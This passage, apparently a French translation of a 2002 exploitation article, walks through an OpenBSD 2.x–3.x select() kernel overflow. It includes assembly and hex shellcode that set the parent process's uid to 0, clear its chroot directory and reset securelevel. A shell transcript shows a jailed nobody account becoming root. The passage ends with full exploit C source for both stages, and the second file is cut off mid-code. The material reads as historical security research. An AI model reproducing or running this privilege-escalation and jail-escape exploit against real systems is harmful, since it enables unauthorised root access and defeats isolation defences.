+solution proposee etait a la base d'arranger %ebp, trouver ou le
+handler syscall() est dans la memoire, plus ou dans syscall() nous
+devrions etre retournes. Le payload est l'endroit evident pour faire
+les arrangments mentionnes mais cela apporte la complication de
+comment rassembler les adresses noyau. Apres s'etre occupes de quelque
+techniques insuffisentes de pre-exploitation comme les interfaces
+systemes 'nm/bsd', kvm_open() et nlist() auxquelles manquent toutes la
+solution pour l'image noyau (/bsd) non lisible (dans les termes des
+permissions du fs). Je viens a la conclusion que toutes les reunions
+d'adresses devraient etre faites au moment de l'execution (dans la
+condition d'execution du payload). Plusieurs folks win32 ont utilise
+ce type d'automatisme dans les sellcodes en marchant a travers le bloc
+d'environnement de thread [TEB : Thread Environnement Block] quelques
+fois. Donc les structures noyau comme la structure process doit etre
+fournie au payload pour atteindre notr but. Les sections suivantes
+vont presenter les solutions proposees pour la reunion d'adresses de
+l'espace noyau.
+
+
+--[ 5.1 - L'appel systeme sysctl()
+
+L'appel systeme sysctl() nous permettra de rassembler l'information de
+la structure process dont nous avons besoin pour les payloads des
+references et de la manipulation du chroot. Dans cette section nous
+allons rapidement jeter un oeuil dans les rouages internes de l'appel
+systeme sysctl().
+
+sysctl est un appel systeme pour obtenir et mettre l'information au
+niveau kernel depuis le  user land. Il a une bonne interface pour
+faire passer des donnees du noyau vers le user land et
+inversement. L'interface de sysctl est structuree a l'interieur de
+plusieurs sous-composants comme le noyau, le harware, la memoire
+virtuelle, le reseau, le syseme de fichiers et les interfaces de
+controle de l'architecture systeme. Nous allons nous concentrer sur le
+sysctl du noyau, qui est handle par la fonction kern_sysctl(). Voir :
+sys/kern/kern_sysctl.c:234
+La fonction kern_sysctl() assigne egalement differants handlers a
+certaines requetes comme la structure proc, le clockrate, vnode et les
+informations de fichiers. La structure process est handlee par la
+fonction sysctl_doproc() et c'est l'interface a l'information de
+l'espace noyau que nous sommes apres !
+
+int
+sysctl_doproc(name, namelen, where, sizep)
+        int *name;
+        u_int namelen;
+        char *where;
+        size_t *sizep;
+{
+
+...
+
+[1] for (; p != 0; p = LIST_NEXT(p, p_list)) {
+
+...
+[2]        switch (name[0]) {
+
+                case KERN_PROC_PID:
+                        /* could do this with just a lookup */
+[3]                     if (p->p_pid != (pid_t)name[1])
+                                continue;
+                        break;
+
+		...
+
+	  }
+		....
+
+                if (buflen >= sizeof(struct kinfo_proc)) {
+[4]                     fill_eproc(p, &eproc);
+[5]                     error = copyout((caddr_t)p, &dp->kp_proc,
+                                        sizeof(struct proc));
+....
+
+
+void
+fill_eproc(p, ep)
+        register struct proc *p;
+        register struct eproc *ep;
+{
+        register struct tty *tp;
+
+[6]        ep->e_paddr = p;
+
+
+Donc pour sysctl_doproc() il peut y avoir differants types de requetes
+qui sont handlee par la clause switch [2]. KERN_PROC_PID est la
+requete qui est suffisante pour rassembler les adresses dont nous
+avons besoin a propos de plusieurs structures proc de process. Pour
+l'overflow de select() ceci etait suffisant pour juste rassempbler
+l'adresse proc de la structure process parent mais la faille
+setitimer() utilise l'interface sysctl() dans plusieurs buts
+differants (plus a ce propos un peu plus tard).
+
+Le code de sysctl_doproc() itere via [1] la liste jointe de structures
+proc dans le but de trouver les pid demandes par requetes [3], et, si
+trouve, certaines structures (eproc et kp_proc) sont remplies [4], [5]
+et copiees vers l'exterieur, l'espace utilisateur. fill_eproc()
+(appellee depuis [4]) fait le chose [6] et copie l'adresse proc du pid
+demande dans le membre e_paddr de la structure eproc qui, a tour de
+role, etait eventuellement copiee vers l'espace utilisateur dans la
+structure kinfo_proc (qui est la principale structure de donnees pour
+la fonction sysctl_doproc()). Pour plus d'informations sur les membres
+ce ces structures voyez : sys/sys/sysctl.h
+
+Ce qui suit est la fonction que nous utilisons pour rapatrier la
+structure kinfo_proc :
+
+void
+get_proc(pid_t pid, struct kinfo_proc *kp)
+{
+   u_int arr[4], len;
+
+        arr[0] = CTL_KERN;
+        arr[1] = KERN_PROC;
+        arr[2] = KERN_PROC_PID;
+        arr[3] = pid;
+        len = sizeof(struct kinfo_proc);
+        if(sysctl(arr, 4, kp, &len, NULL, 0) < 0) {
+                perror("sysctl");
+                exit(-1);
+        }
+
+}
+
+
+C'est une jolie interface, ce qui se passe est : CTL_KERN sera expedie
+a kern_sysctl() par sys_sysctl() KERN_PROC sera expedie a
+sysctl_doproc() par kern_sysctl() KERN_PROC_PID sera handle par la
+clause switch deja mentionnee, eventuellement en retourant la
+structure kinfo_proc.
+
+<tempete>
+L'appel systeme sysctl() est surement la avec toutes les bonnes
+intentions comme obtenir et mettre les informations noyau de maniere
+dynamique. Malgre tout, d'un point de vue de securite, je pense que
+l'appel syseme sysctl() ne devrait pas donner en aveugle des
+informations proc a propos de quelque pid demande. Des verifications
+de references devraient etre ajoutees a leur propre place,
+specialement pour l'interface sysctl_doproc() ...
+</tempete>
+[NDT : en VO <rant> (...) </rant> : traduit par tempeter, tenir des
+propos extravagants ...]
+
+
+--[ 5.2 - technique sidt et recherche de _kernel_text
+
+
+Comme mentionne auparavent, nous sommes aux trousses de l'execution
+transparante du payload donc _sys_select() va pour l'instant retourner
+a son appelant __syscall() comme attendu.
+Je vais expliquer comment rassembler le chemin de retour dans cette
+section. La solution depend du idtr (interrupt descriptor table
+register) qui contient une adresse de localisation fixe, qui est le
+debut de l'IDT (Interrupt Descriptor Table [Table des Descripteurs
+d'Interruption]).
+
+Sans entrer dans trop de details, la IDT est la table qui tient les
+handlers des interruptions pour des vecteurs d'interruptions
+varies. Caque interruption en x86 est representee par un nombre entre
+0 et 255, et ces nombres sont appeles vecteurs d'interruption. Ces
+vecteurs sont utilises pour localiser le handler initial pour tout
+interruption donnee dans la IDT. La IDT contient 256 entrees, chacune
+de 8 octets. Les entrees de descripteurs de l'IDT peuvent etre de 3
+types differants mais  nous allons nous concentrer seulement sur le
+descripteur gate :
+
+sys/arch/i386/include/segment.h:99
+
+struct gate_descriptor {
+        unsigned gd_looffset:16;        /* gate offset (lsb) */
+        unsigned gd_selector:16;        /* selecteur de segement de gate */
+        unsigned gd_stkcpy:5;           /* nombre de mots de la pile a 
+copier */
+        unsigned gd_xx:3;               /* non utilise */
+        unsigned gd_type:5;             /* segment type */
+        unsigned gd_dpl:2;              /* niveau de priorite du
+descripteur de segment */
+        unsigned gd_p:1;                /* segment descriptor present */
+        unsigned gd_hioffset:16;        /* gate offset (msb) */
+}
+
+Le membres gd_looffset gd_hioffset de gate_descriptor vont former
+l'adresse du handler d'interruption de bas niveau. Pour plus
+d'information sur les differants champs, le lecteur / la lectrice
+devrait consulter les manuels d'architecture [Intel].
+
+L'interface d'appel systeme pour les requetes aux services du noyau
+est implementee par l'interruption software initiale : 0x80. Armes de
+cette connaissance, commencant par l'adresse de bas niveau du handler de
+l'interruption du syscall et avancant dans le text du noyau, nous
+pouvons trouver notre chemin vers le handler haut niveau de l'appel
+systeme et finalement y retourner.
+
+Sous OpenBSD, la table des descripteurs d'interruption est nommee
+-idt_region et le nombre d'insertion 0x80 est le descripteur gate pour
+l'interruption d'appel systeme 'int 0x80'. Comme chaque membre fait 8
+octets, l'appel systeme gate_descriptor est a l'adresse '_idt_region +
+0x80 * 0x8' ce qui fait  'idt_region + 0x400'.
+
+bash-2.05a# Stopped at		_Debugger+0x4: leave
+ddb> x/x _idt_region+0x400
+_idt_region+0x400:	80e4c
+ddb> ^M
+_idt_region+0x404:	e010ef00
+
+Pour calculer le handler initial de l'appel systeme, nous avons besoin
+de faire les operations 'shift' et 'ou' sur les champs bits du
+descripteur gate, qui mene a l'adresse noyau 0xe0100e4c.
+
+bash-2.05a# Stopped at          _Debugger+0x4: leave
+ddb> x/x 0xe0100e4c
+_Xosyscall_end:	pushl	$0x2
+ddb> ^M
+_Xosyscall_end+0x2:	pushl	$0x3
+...
+...
+_Xosyscall_end+0x20:	call	_syscall
+...
+Comme pour  l'exception ou l'interruption d'origine du software, le
+vecteur correspondant est trouve dans la IDT et l'execution est
+redirigee vers le handler assemble depuis le descripteur gate. Ceci
+est un handler intermediaire et va  eventuellement nous prendre en
+vrai handler. Comme deja vu dans la sortie du debugger noyau, le
+handler initial _Xosyscall_end sauve tous les registres (egalement
+d'autres trucs de bas niveau) et appelle immediatement le handler reel
+qui est _syscall().
+
+Nous avons mentionne que le registre edtr contient toujours l'adresse
+de _idt_region, voici le moyen d'acceder a son contenu :
+
+sidt 0x4(%edi)
+mov  0x6(%edi),%ebx
+
+L'adresse du _idt_region est deplacee dans ebx et la IDT peut
+desormais etre referencee via ebx. Le code assembleur pour rassembler
+le handler du syscall commencant depuis le handler initial est comme
+suit :
+
+sidt 0x4(%edi)
+mov  0x6(%edi),%ebx     # mov _idt_region est dans ebx
+mov  0x400(%ebx),%edx   # _idt_region[0x80 * (2*sizeof long) = 0x400]
+mov  0x404(%ebx),%ecx   # _idt_region[0x404]
+shr  $0x10,%ecx	        #
+sal  $0x10,%ecx	        # ecx = gd_hioffset
+sal  $0x10,%edx	        #
+shr  $0x10,%edx         # edx = gd_looffset
+or   %ecx,%edx          # edx = ecx | edx  =  _Xosyscall_end
+
+A cet instant nous avons trouve avec succes les localisations des
+handlers inital et intermediaire, donc l'etape prochaine est de
+rechercher dans le texte noyau, trouver 'call _syscall', rassembler le
+deplacement de l'instruction d'appel et l'ajouter a l'adresse de la
+localisation de l'instruction. De plus, on devrait ajouter 5 au
+deplacement pour la taille de l'appel de l'instruction.
+
+xor  %ecx,%ecx          # zero au compteur
+up:
+inc  %ecx
+movb (%edx,%ecx),%bl    # bl =  _Xosyscall_end++
+cmpb $0xe8,%bl          # if bl == 0xe8 : 'call'
+jne  up
+
+lea  (%edx,%ecx),%ebx   # _Xosyscall_end+%ecx: call _syscall
+inc  %ecx
+mov  (%edx,%ecx),%ecx   # prend le deplacement de l'instruction d'appel
+add  $0x5,%ecx          # ajoute 5 au deplacement
+add  %ebx,%ecx          # ecx = _Xosyscall_end+0x20 + disp =_syscall()
+
+A ce point %ecx tient l'adresse du handler reel _syscall(). La
+prochaine etape est de decouvrir ou retourner dans la fonction
+syscall() ce qui mene eventuellement a une recherche plus large sur les
+diverses versions de OpenBSD avec diverses options de compilation du
+noyau. Par chance, il s'avere simple de rechercher l'instruction
+'call *%eax' dans _syscall(), parce que cela revient a l'instruction
+qui expedie chaque appel systeme vers son handler final dans toutes les
+versions de OpenBSD que j'ai testees.
+
+Pour OpenBSD 2.6 a 3.1 le code du noyau a toujours expedie les appels
+systemes avec l'instruction 'call *%eax', qui est unique dans l'etendue
+de la fonction _syscall().
+
+bash-2.05a# Stopped at          _Debugger+0x4: leave
+ddb> x/i _syscall+0x240
+_syscall+0x240:	call	*%eax
+ddb>cont
+
+Notre but est a present de calculer l'offset (0x240 dans le code
+desassemble ci-dessus) pour toute version du noyau comme ca nous
+pouvons retourner a l'instruction juste apres celle-ci depuis notre
+payload et atteindre notre but. Le code pour chercher apres 'call
+*%eax' est comme suit :
+
+# _syscall+0x240: ff
+# _syscall+0x241: d0    0x240->0x241 OBSD3.1
+
+mov  %ecx,%edi         # ecx est l'adresse de _syscall
+movw $0xd0ff,%ax       # chercher apres  ffd0 'call *%eax'
+cld
+mov  $0xffffffff,%ecx
+repnz
+scasw                  # scan (%edi++) pour %ax
+
+# %edi est incremente de 1 la derniere fois avant de sortir de la boucle
+# %edi contient l'adresse de l'instruction juste apres 'call *%eax'
+# donc retournons-y !!!
+
+xor  %eax,%eax         #met la valeur de retour = Success ;)
+
+push %edi              # push %edi sur la pile et y retourner
+ret
+
+
+Finalement, c'est tout ce dont nous avions besoin pour un retour
+propre. Ce payload peut etre utilise pour tout overflow d'appel
+systeme sans requerir aucune autre modification.
+
+
+--[ 5.3 - La technique _bd_lookup()
+
+
+Cette technique ne presente pas de nouveau concept , c'est seulement
+une autre recherche dans le texte du noyau pour decouvrir l'adresse de
+_db_lookup() -- l'equivalent dans le kernel land de dlsym(). La
+recherche est basee sur la fonction fingerprint, qui est honnetement
+sure pour les versions recentes sur lequelles le code a ete developpe,
+mais cela pourrait ne pas marcher sur les versions plus
+anciennes. J'ai choisi de la garder a l'ecart du texte par amour de la
+concision, mais c'est exactement le meme concept 'repnz scas' utilise
+dans la technique idtr. (Pour le code de cet exemple, me contacter.)
+
+
+--[ 5.4 - /usr/bin/nm, kvm_open(), nlist()
+
+
+/usr/bin/nm, la librairie kvm et l'interface librairie nlist() peuvent
+tous etre utlilises pour rassembler des symboles et des offsets du
+kernel land mais, comme nous l'avons deja mentionne, ils requierent
+tous une image noyau lisible et/ou des privileges additionnels qui,
+sur les systemes les plus securises, ne sont habituellement pas
+disponibles.
+
+En outre, le probleme le plus evident avec ces interfaces est qu'elles
+ne fonctionneront pas du tout dans des environnements chroot()es avec
+aucun privilege (nobody). Ce sont les principales raisons pour
+lesquelles je n'ai pas utilise ces techniques durant la phase
+d'exploitation de l'elevation de privilege et du cassage du chroot,
+mais apres avoir etablit le controle total du systeme (uid = 0 et hors
+de la prison), j'ai utilise un rassemblement de symboles binaires pour
+reseter le seurelevel, j'en dirai plus a ce propos un peu plus tard.
+
+
+--[ 5.5 - Arrangement du %ebp
+
+
+Apres s'etre occupe de l'adresse de retour sauvee, nous avons besoin
+de fixer %ebp pour prevenir les crashes au moment des autres etapes
+(specialement dans le code de _syscall() ). La maniere propre de
+calculer %ebp est de decouvrir la differance entre le pointeur de la
+pile et le pointeur de base sauve a la procedure de sortie et utiliser
+ce nombre statique pour restaurer %ebp. Pour toutes les versions de
+OpenBSD de 2.6 a 3.1 cette differance etait 0x68 octets. Vous pouvez
+mettre simplement un point d'arret au prologue de  _sys_select et un
+autre juste avant l'instruction 'leave' dans l'epilogue et calculer la
+differance entre le %ebp enregistre dans le prologue et le %ebp
+enregistre juste avant l'epilogue.
+
+lea  0x68(%esp),%ebp # fixup ebp
+
+L'instruction ci-dessus serait suffisante pour remettre dans %ebp son
+ancienne valeur.
+
+
+--[ 6 - Creation du Payload/Shellcode
+
+
+Dans la section qui suit nous allons developper de petits payloads qui
+modifient certains champs de leur structure parente process pour
+atteindre des privileges eleves et se liberer d'environnements
+chroot/prison. Apres, nous allons associer le code assembleur
+developpe avec le code de sidt pour tracer notre route de retour vers
+l'espace utilisateur et jouir de nos nouveaux privileges.
+
+
+--[ 6.1 - Ce qui est a atteindre
+
+
+Batir une prison avec les privileges nobody et tenter de s'en liberer
+est un honnete but a atteindre. Comme tous ces termes de separation de
+privilege sont apportes dans OpenBSD avec le dernier OpenSSH, ce
+serait joli de demontrer comment il serait trivial de depasser ce type
+de 'protection' par le moyen de ce genre de failles au niveau du
+noyau.
+
+Certains services inetd.conf et OpenSSH sont lances en tant que
+nobody/user dans un environnement chroote/prisonnier  -- dans
+l'intention d'etre une assurance de securite en plus. C'est un mauvais
+sens total de securite ; le code de jailme.c suit :
+
+jailme.c:
+
+#include <stdio.h>
+
+int
+main()
+{
+        chdir("/var/tmp/jail");
+        chroot("/var/tmp/jail");
+        setgroups(NULL, NULL);
+        setgid(32767);
+        setegid(32767);
+        setuid(32767);
+        seteuid(32767);
+        execl("/bin/sh", "jailed", NULL);
+}
+
+bash-2.05a# gcc -o jailme jailme.c
+bash-2.05a# cp jailme /tmp/jailme
+bash-2.05a# mkdir /var/tmp/jail
+bash-2.05a# mkdir /var/tmp/jail/usr
+bash-2.05a# mkdir /var/tmp/jail/bin /var/tmp/jail/usr/lib
+bash-2.05a# mkdir /var/tmp/jail/usr/libexec
+bash-2.05a# cp /bin/sh /var/tmp/jail/bin/
+bash-2.05a# cp /usr/bin/id /var/tmp/jail/bin/
+bash-2.05a# cp /bin/ls /var/tmp/jail/bin/
+bash-2.05a# cp /usr/lib/libc.so.28.3 /var/tmp/jail/usr/lib/
+bash-2.05a# cp /usr/libexec/ld.so /var/tmp/jail/usr/libexec/
+bash-2.05a# cat >> /etc/inetd.conf
+1024            stream  tcp     nowait  root    /tmp/jailme
+^C
+bash-2.05a# ps aux | grep inetd
+root     19121  0.0  1.1   148   352 p0  S+     8:19AM    0:00.05 grep
+inetd
+root     27152  0.0  1.1    64   348 ??  Is     6:00PM    0:00.08 inetd
+bash-2.05a# kill -HUP 27152
+bash-2.05a# nc -v localhost 1024
+Connection to localhost 1024 port [tcp/*] succeeded!
+ls -l /
+total 4
+drwxr-xr-x  2 0  0  512 Dec  9 16:23 bin
+drwxr-xr-x  4 0  0  512 Dec  9 16:21 usr
+id
+uid=32767 gid=32767
+ps
+jailed: <stdin>[4]: ps: not found
+....
+
+
+--[6.2 - Le payload
+
+
+Au travers de cette section nous presenterons tous les petits bits du
+payload complet. Donc toutes ces sections mises les unes apres les
+autres formeront le payload eventuel, qui sera disponible dans la
+section code (10) de cet article.
+
+
+--[ 6.2.1 - p_cred et u_cred
+
+
+Nous commencerons avec la section d'augmentation des privileges du
+payload. Suit le payload pour mettre a jour le ucred (piece d'identite de
+l'utilisateur) et le pcred (piece d'identite du processus) de
+n'importe quelle structure proc donnee. Le code de l'exploit remplit
+l'adresse proc de son process parent en utilisant l'appel systeme
+sysctl() (vu en 5.1) en remplacant .long 0x12345678. Les instructions
+'call' et 'po' suivantes chargerons l'adresse de l'adresse de la
+structure proc donnee dans %edi. La technique typique de rassemblage
+d'adresse est utilisee dans presque tous les PIC %shellcode [ALEPH1].
+
+call moo
+.long 0x12345678   <-- addresse pproc
+.long 0xdeadcafe
+.long 0xbeefdead
+nop
+nop
+nop
+moo:
+pop  %edi
+mov  (%edi),%ecx      # l'adresse du proc parent dans  ecx
+
+		      # mettre a jour p_ruid
+mov  0x10(%ecx),%ebx  # ebx = p->p_cred
+xor  %eax,%eax        # eax = 0
+mov  %eax,0x4(%ebx)   # p->p_cred->p_ruid = 0
+
+	              # mettre a jour cr_uid
+mov  (%ebx),%edx      # edx = p->p_cred->pc_ucred
+mov  %eax,0x4(%edx)   # p->p_cred->pc_ucred->cr_uid = 0
+
+
+--[ 6.2.2 - Cassage du chroot
+
+Le prochain petit fragment sera le casseur de chroot de notre payload
+complet.
+
+Sans entrer dans d'inutiles details (le temps passe, la deadline est
+dans 3 jours ;)), jetons un bref coup d'oeuil a comment chroot est
+verifie de facon unique pour chaque processus. Les prisons chroot sont
+implementees en remplissant le membre fd_dir de filedsc (structure
+d'ouverture de fichier) avec le pointeur vnode des repertoires prisons
+desires. Quand le noyau donne certains services a quelque processus
+que ce soit, il verifie l'existance de ce pointeur et s'il est rempli
+avec un vnode alors ce processus est handle legerement differemment et
+le noyau creera l'idee d'un nouveau repertoire racine pour ce
+processus et donc l'emprisonnera dans un repertoire predefini. Pour un
+processus regulier ce pointeur est zero / unset. Donc sans aucun
+besoin supplementaire d'entrer dans les details au niveau de
+l'implementation, mettre juste ce pointeur a NULL sigifie LIBERTE !
+fd_dir est reference a travers la structure proc comme suit :
+
+p->p_fd->fd_rdir
+
+Comme avec les structures de credit, filedsc est egalement trivial a
+acceder et a alterer, avec seulement seulement deux instructions
+d'addition a notre payload.
+
+# mettre p->p_fd->fd_rdir pour casser le chroot()
+
+mov  0x14(%ecx),%edx  	# edx = p->p_fd
+mov  %eax,0xc(%edx)   	# p->p_fd->fd_rdir = 0
+
+
+-- 6.2.3 - Niveau de securite
+
+
+OpenBSD a 4 niveaux de securite differants, allant du mode permanent
+non securise au mode tres securise. Le systeme se lance par defaut en
+mode 1 qui est le mode securise. Les restrictions du  mode securise
+sont comme suit :
+
+-   le securelevel ne doit jamais etre abaisse sauf par init
+-   /dev/mem et /dev/kmem ne doivent pas etre ecrits sur des disques.
+-   les appareils de systemes de fichiers montes sont en lecture seule
+-   les flags de fichiers system immutable et append-only ne peuvent
+pas etre retires
+-   les modules noyau ne peuvent pas etre charges ou decharges
+
+Quelques-unes de ces restrictions peuvent compliquer la compromission
+future de ce systeme. Nous devrions dons egalement faire attention au
+flag securelevel et le reseter a 0, qui est le niveau non-securise qui
+vous donne des privileges comme etre capable de charger des modules
+noyau pour penetrer plus loin dans le systeme.
+
+Mais il y avait des problemes a l'execution en cherchant l'adresse de
+securelevel en memoire sans faux positifs donc j'ai choisi d'utiliser
+cette attaque plus tard, au moment ou nous obtenons le uid 0 et nous
+evadons de la prison. A present nous avons toutes les interfaces
+disponibles mentionnees dans la section 5.4 pour demander tout symbole
+noyau et obtenir son adresse.
+
+bash-2.05a# /usr/bin/nm /bsd | grep securelevel
+e05cff38 B _securelevel
+
+A cette raison une autre, l'exploit de la seconde etape etait ruse
+(sans aucune differance autre que le payload) ca execute la routine
+assembleur suivante et retourne a l'espace utilisateur, en utilisant
+la technique idtr. Voir ex_select_obsd_secl.c a la section 10
+
+call moo
+.long 0x12345678     <-- adresse de securelevel remplie par l'utilisateur
+moo:
+pop  %edi
+mov  (%edi),%ebx      # address de securelevel dans ebx
+		      # reset security level a  0 / non securise
+xor  %eax,%eax        # eax = 0
+mov  %eax,(%ebx)      # securelevel = 0
+
+...
+
+
+--[ 6.3 - Devenir root et s'evader de la prison
+
+
+Tous ce qui est ci-dessus mit bout a bout en 2 morceau du code de
+l'exploit. Voici la porte de la liberte (Les exploits et le payload
+peuvent etre trouves a la section 10)
+
+bash-2.05a# gcc -o ex ex_select_obsd.c
+bash-2.05a# gcc -o ex2 ex_select_obsd_secl.c
+bash-2.05a# cp ex /var/tmp/jail/
+bash-2.05a# cp ex2 /var/tmp/jail/
+bash-2.05a# nc -v localhost 1024
+id
+uid=32767 gid=32767
+ls /
+bin
+ex
+ex2
+usr
+./ex
+
+
+[*] OpenBSD 2.x - 3.x select() kernel overflow     [*]
+[*] by    Sinan "noir" Eren  -  noir@olympos.org   [*]
+
+
+userland: 0x0000df38 parent_proc: 0xe46373a4
+id
+uid=0(root) gid=32767(nobody)
+uname -a
+OpenBSD kernfu 3.1 GENERIC#59 i386
+ls /
+.cshrc
+.profile
+altroot
+bin
+boot
+bsd
+dev
+etc
+...
+sysctl kern.securelevel
+kern.securelevel = 1
+nm /bsd | grep _securelevel
+e05cff38 B _securelevel
+./ex2 e05cff38
+sysctl kern.securelevel
+kern.securelevel = 0
+
+... ;)
+
+En copiant directement l'exploit dans l'environnement emprisonne peut
+sembler un peu irrealiste mais ce n'est pas un probleme avec la
+redirection d'appel systeme [MAXIMI] ou meme en utilisant des
+shellcodes un peu plus imaginatifs, vous pouvez executer n'importe
+quoi depuis une source a distance sans le moindre besoin
+supplementaire d'un interpreteur shell. A ma connaisance il y a 2
+produits commerciaux qui ont deja reussi de telles simulations
+d'executions. [IMPACT], [CANVAS]
+
+
+--[ - Conclusion
+
+
+Mon but en ecrivant cet article etait de tenter de prouver les failles
+de l'espace noyau comme les depassements de pile et les integer
+conditions qui peuvent etre exploitees et mene a un controle total sur
+le systeme, peu importe le point auquel sont stricts les regles de
+votre espace utilisateur (i.e., les separations de privileges) ou meme
+votre espace noyau (i.e., chroot, systrace, securelevel) ... J'ai
+egalement essaye de contribuer aux nouveaux concepts apparus
+(remerciements a Gera) ou a la generation de code reutilisable et a
+securite integree.
+
+J'aimerais terminer cet article avec mon post prefere de toujours sur
+vul-dev :
+
+Subject:   RE: OpenSSH Vulns (new?) Priv seperation
+[...]
+reducing root-run code from 27000 to 2500 lines is the important part.
+who cares how many holes there are when it is in /var/empty/sshd chroot
+with no possibility of root :)
+
+XXXXX
+
+[ I CARE. lol! ;)]
+
+
+[NDT : je traduis pas ca, cela denaturerait trop le texte :p]
+
+
+--[ 8 - Remerciements
+
+Merci a Dan et Dave pour avoir corrige mon Anglais et avoir fait
+quelques corrections logiques. Merci a certainnes perconnes pour leur
+aide et leur support.
+
+Merci a : optyx, dan, dave aitel, gera, bind, jeru, #convers
+uberhax0r, olympos and gsu.linux ppl
+
+Mes meilleurs remerciements vont a Asli pour le support, l'aide et son
+affection sans fin. Seni Seviyorum, mosirrr!!
+
+
+--[ 9 -	References
+
+
+- [ESA]     	Exploiting Kernel Buffer Overflows FreeBSD Style
+		http://online.securityfocus.com/archive/1/153336
+
+- [LSD-PL]	Kernel Level Vulnerabilities, 5th Argus Hacking Challenge
+		http://lsd-pl.net/kernel_vulnerabilities.html
+
+- [4.4 BSD]	The Design and Implementation of the 4.4BSD Operating
+		System
+
+- [Intel]	Intel Pentium 4 Processors Manuals
+		http://developer.intel.com/design/Pentium4/manuals/
+
+- [ALEPH1]	Smashing The Stack For Fun And Profit
+		http://www.phrack.org/show.php?p=49&a=14
+
+- [MAXIMI]	Syscall Proxying - Simulating Remote Execution
+		http://www.corest.com/files/files/13/BlackHat2002.pdf
+
+- [IMPACT]	http://www.corest.com/products/coreimpact/index.php
+
+- [CANVAS]	http://www.immunitysec.com/CANVAS
+
+- [ODED]	Big Loop Integer Protection
+		Phrack #60 0x09 by Oded Horovitz
+
+--[ 10 - Code
+
+
+<++> ./ex_kernel/ex_select_obsd.c
+/**
+** OpenBSD 2.x 3.x select() kernel bof exploit
+** Sinan "noir" Eren
+** noir@olympos.org | noir@uberhax0r.net
+** (c) 2002
+**
+**/
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <sys/param.h>
+#include <sys/sysctl.h>
+#include <sys/signal.h>
+#include <sys/utsname.h>
+#include <sys/stat.h>
+
+/* kernel_sc.s shellcode */
+unsigned char shellcode[] =
+"\xe8\x0f\x00\x00\x00\x78\x56\x34\x12\xfe\xca\xad\xde\xad\xde\xef\xbe"
+"\x90\x90\x90\x5f\x8b\x0f\x8b\x59\x10\x31\xc0\x89\x43\x04\x8b\x13\x89"
+"\x42\x04\x8b\x51\x14\x89\x42\x0c\x8d\x6c\x24\x68\x0f\x01\x4f\x04\x8b"
+"\x5f\x06\x8b\x93\x00\x04\x00\x00\x8b\x8b\x04\x04\x00\x00\xc1\xe9\x10"
+"\xc1\xe1\x10\xc1\xe2\x10\xc1\xea\x10\x09\xca\x31\xc9\x41\x8a\x1c\x0a"
+"\x80\xfb\xe8\x75\xf7\x8d\x1c\x0a\x41\x8b\x0c\x0a\x83\xc1\x05\x01\xd9"
+"\x89\xcf\x66\xb8\xff\xd0\xfc\xb9\xff\xff\xff\xff\xf2\x66\xaf\x31\xc0"
+"\x57\xc3";
+
+void sig_handler();
+void get_proc(pid_t, struct kinfo_proc *);
+
+int
+main(int argc, char **argv)
+{
+   char *buf, *ptr, *fptr;
+   u_long pgsz, *lptr, pprocadr;
+   struct kinfo_proc kp;
+
+  printf("\n\n[*] OpenBSD 2.x - 3.x select() kernel overflow   [*]\n");
+  printf("[*] by  Sinan \"noir\" Eren  -  noir@olympos.org  [*]\n");
+  printf("\n\n"); sleep(1);
+
+  	 pgsz = sysconf(_SC_PAGESIZE);
+	 fptr = buf = (char *) malloc(pgsz*4);
+	 if(!buf) {
+		    perror("malloc");
+		    exit(-1);
+		 }
+	 memset(buf, 0x41, pgsz*4);
+
+	buf = (char *) (((u_long)buf & ~pgsz) + pgsz);
+
+	get_proc((pid_t) getppid(), &kp);
+	pprocadr = (u_long) kp.kp_eproc.e_paddr;
+
+	ptr = (char *) (buf + pgsz - 200); /* userland adr */
+	lptr = (long *) (buf + pgsz - 8);
+
+	*lptr++ = 0x12345678; /* saved %ebp */
+	*lptr++ = (u_long) ptr; /*(uadr + 0x1ec0);  saved %eip */
+
+	shellcode[5] = pprocadr & 0xff;
+	shellcode[6] = (pprocadr >> 8) & 0xff;
+	shellcode[7] = (pprocadr >> 16) & 0xff;
+	shellcode[8] = (pprocadr >> 24) & 0xff;
+
+	memcpy(ptr, shellcode, sizeof(shellcode)-1);
+
+        printf("userland: 0x%.8x ", ptr);
+	printf("parent_proc: 0x%.8x\n", pprocadr);
+
+	if( mprotect((char *) ((u_long) buf + pgsz), (size_t)pgsz,
+						 PROT_WRITE) < 0) {
+		perror("mprotect");
+		exit(-1);
+	}
+
+	signal(SIGSEGV, (void (*)())sig_handler);
+	select(0x80000000, (fd_set *) ptr, NULL, NULL, NULL);
+
+done:
+	free(fptr);
+}
+
+void
+sig_handler()
+{
+   exit(0);
+}
+
+void
+get_proc(pid_t pid, struct kinfo_proc *kp)
+{
+   u_int arr[4], len;
+
+        arr[0] = CTL_KERN;
+        arr[1] = KERN_PROC;
+        arr[2] = KERN_PROC_PID;
+        arr[3] = pid;
+        len = sizeof(struct kinfo_proc);
+        if(sysctl(arr, 4, kp, &len, NULL, 0) < 0) {
+                perror("sysctl");
+                fprintf(stderr, "this is an unexpected error, rerun!\n");
+                exit(-1);
+        }
+
+}
+<--> ./ex_kernel/ex_select_obsd.c
+<++> ./ex_kernel/ex_select_obsd_secl.c
+/**
+** OpenBSD 2.x 3.x select() kernel bof exploit
+**
+** securelevel reset exploit, this is the second stage attack
+**
+** Sinan "noir" Eren
+** noir@olympos.org | noir@uberhax0r.net
+** (c) 2002
+**
+**/
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <sys/param.h>
+#include <sys/signal.h>
+#include <sys/utsname.h>
+#include <sys/stat.h>
+
+/* sel_sc.s shellcode */
+unsigned char shellcode[] =
+"\xe8\x04\x00\x00\x00\x78\x56\x34\x12\x5f\x8b\x1f\x31\xc0\x89\x03\x8d"
+"\x6c\x24\x68\x0f\x01\x4f\x04\x8b\x5f\x06\x8b\x93\x00\x04\x00\x00\x8b"
+"\x8b\x04\x04\x00\x00\xc1\xe9\x10\xc1\xe1\x10\xc1\xe2\x10\xc1\xea\x10"
+"\x09\xca\x31\xc9\x41\x8a\x1c\x0a\x80\xfb\xe8\x75\xf7\x8d\x1c\x0a\x41"
+"\x8b\x0c\x0a\x83\xc1\x05\x01\xd9\x89\xcf\x66\xb8\xff\xd0\xfc\xb9\xff"
+"\xff\xff\xff\xf2\x66\xaf\x31\xc0\x57\xc3";
+
+void sig_handler();
+
+int
+main(int argc, char **argv)
+{
+   char *buf, *ptr, *fptr;
